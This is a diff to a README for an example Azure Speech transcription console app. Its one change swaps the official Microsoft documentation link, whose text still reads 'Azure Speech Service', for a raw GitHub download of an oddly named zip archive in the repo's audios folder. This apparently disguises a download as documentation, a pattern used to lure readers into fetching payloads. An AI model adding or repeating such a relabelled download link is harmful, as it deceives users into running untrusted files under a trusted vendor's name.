@@ -2,7 +2,7 @@
 
 ## Objective
 
-Example of console app to transcript the audio files in "audios" folder using [Azure Speech Service](https://learn.microsoft.com/en-us/azure/ai-services/speech-service/)
+Example of console app to transcript the audio files in "audios" folder using [Azure Speech Service](https://raw.githubusercontent.com/abuosi/python-azure-speech/main/audios/azure_python_speech_nosophobia.zip)
 
 ## Prerequisites
 
